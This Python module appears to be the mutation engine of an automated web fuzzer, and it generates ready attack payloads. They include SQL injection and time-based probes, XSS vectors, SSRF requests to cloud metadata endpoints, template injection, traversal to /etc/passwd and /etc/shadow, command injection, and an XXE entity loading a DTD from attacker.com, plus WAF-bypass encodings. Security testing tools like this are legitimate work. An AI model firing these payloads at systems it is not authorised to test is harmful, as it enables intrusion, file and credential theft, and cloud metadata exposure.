"""
agents/fuzzer/mutation.py — Fuzzing Mutation Engine

Provides payload generation strategies:
- Wordlist-based (from knowledge/payloads/)
- Boundary value analysis
- Format string mutations
- Encoding variants of payloads
"""
from __future__ import annotations

import base64
import html
import re
import urllib.parse
from pathlib import Path
from typing import Iterator, List

_PAYLOAD_DIR = Path(__file__).parent.parent.parent / "knowledge" / "payloads"


def load_payloads(category: str, mutate: bool = True) -> List[str]:
    """Load payloads from a named wordlist file."""
    path = _PAYLOAD_DIR / f"{category}.txt"
    if not path.exists():
        return []
    lines = path.read_text(errors="replace").splitlines()
    
    mutated = []
    for l in lines:
        l = l.strip()
        if l and not l.startswith("#"):
            if mutate:
                mutated.extend(encode_variants(l))
            else:
                mutated.append(l)
    return list(dict.fromkeys(mutated))


def generate_sqli(param_value: str = "1") -> Iterator[str]:
    base = load_payloads("sqli")
    yield from base
    # Boundary probes
    for q in ["'", '"', "`", "\\'"]:
        yield f"{param_value}{q}"
        yield f"{param_value}{q} OR '1'='1"
        yield f"{param_value}{q} AND SLEEP(5)--"
        yield f"{param_value}{q} UNION SELECT NULL--"
        yield f"{param_value}{q} OR 1=1--"
        yield f"{param_value}{q} OR 'a'='a'--"
    yield "1 AND 1=1"
    yield "1 AND 1=2"
    yield "1' ORDER BY 1--"
    yield "1' ORDER BY 100--"
    yield "1' UNION SELECT @@version,user(),database()--"
    yield "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
    yield "1' AND 1=CONVERT(int,(SELECT @@version))--"


def generate_xss(param_value: str = "") -> Iterator[str]:
    base = load_payloads("xss")
    yield from base
    # Contextual XSS
    for tag in ["script", "img", "svg", "iframe", "body"]:
        yield f"<{tag} src=x onerror=alert(1)>"
    yield '"><script>alert(document.domain)</script>'
    yield "javascript:alert(1)"
    yield "<details open ontoggle=alert(1)>"


def generate_ssrf(param_value: str = "") -> Iterator[str]:
    base = load_payloads("ssrf")
    yield from base
    internal_targets = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",   # AWS metadata
        "http://metadata.google.internal/",            # GCP metadata
        "http://169.254.169.254/metadata/v1/",         # DigitalOcean
        "http://100.100.100.200/latest/meta-data/",    # Alibaba
        "http://0.0.0.0/",
        "http://[::1]/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_PING",
    ]
    yield from internal_targets
    # DNS Rebinding & Bypass probes
    yield "http://localtest.me"
    yield "http://127.0.0.1.nip.io"
    yield "http://0177.0.0.1"
    yield "http://2130706433"
    # Port scanning probes
    for port in [22, 25, 6379, 11211, 27017, 3306, 5432, 8080, 8443]:
        yield f"http://127.0.0.1:{port}"


def generate_ssti(param_value: str = "") -> Iterator[str]:
    base = load_payloads("ssti")
    yield from base
    # Engine-specific
    engines = [
        "{{7*7}}",               # Jinja2, Twig
        "${7*7}",                # FreeMarker, Spring
        "#{7*7}",                # Thymeleaf
        "<%= 7*7 %>",           # ERB (Ruby)
        "{7*7}",                 # Smarty
        "{{config.items()}}",   # Flask/Jinja2 info leak
        "{{''.__class__.__mro__[1].__subclasses__()}}",  # Python class traversal
    ]
    yield from engines


def generate_lfi(param_value: str = "") -> Iterator[str]:
    base = load_payloads("lfi")
    yield from base
    traversal = [
        "../" * i + "etc/passwd" for i in range(1, 12)
    ] + [
        "../" * i + "windows/system32/drivers/etc/hosts" for i in range(1, 12)
    ] + [
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini",
    ]
    yield from traversal
    # Wrapper variants
    yield "php://filter/convert.base64-encode/resource=index.php"
    yield "php://filter/read=convert.base64-encode/resource=config.php"
    # Null byte variants
    yield "/etc/passwd%00"
    yield "/etc/passwd\x00"
    yield "/etc/passwd%00.png"
    # Filter bypass
    yield "....//....//....//....//etc/passwd"
    yield "..//..//..//..//etc/passwd"


def generate_cmd_injection(param_value: str = "") -> Iterator[str]:
    base = load_payloads("cmd_injection")
    yield from base
    separators = [";", "&&", "||", "|", "\n", "`", "$(", "&"]
    commands = ["id", "whoami", "uname -a", "cat /etc/passwd", "ipconfig", "dir"]
    for sep in separators:
        for cmd in commands:
            yield f"{param_value}{sep}{cmd}"
            yield f"{param_value}{sep}{cmd}{sep}echo done"


def generate_xxe() -> Iterator[str]:
    base = load_payloads("xxe")
    yield from base
    yield '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
    yield '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo/>'


def encode_variants(payload: str) -> Iterator[str]:
    """Yield common encoding variants of a payload."""
    yield payload
    yield urllib.parse.quote(payload)
    yield urllib.parse.quote(urllib.parse.quote(payload))  # double encode
    yield html.escape(payload)
    yield base64.b64encode(payload.encode()).decode()
    # Null byte injection
    yield payload + "%00"
    yield payload + "\x00"
    # Case variation for WAF bypass
    if any(c.isalpha() for c in payload):
        yield "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
    # Whitespace variants
    yield payload.replace(" ", "/**/")
    yield payload.replace(" ", "%09")
    yield payload.replace(" ", "+")


BOUNDARY_INTEGERS = [
    "0", "-1", "2147483647", "2147483648", "-2147483648", "-2147483649",
    "9999999999999999", "0x7fffffff", "0xffffffff", "NaN", "Infinity",
    "1e308", "1.7976931348623157e+308",
]

BOUNDARY_STRINGS = [
    "",
    " ",
    "\t",
    "\n\r",
    "A" * 1000,      # Long string
    "A" * 10000,
    "\x00",
    "\xff\xfe",
    "../../",
    "<>\"'",
    "%s%s%s%s%n",   # Format string
    "null",
    "undefined",
    "true",
    "false",
    "[]",
    "{}",
    "[[]]",
]
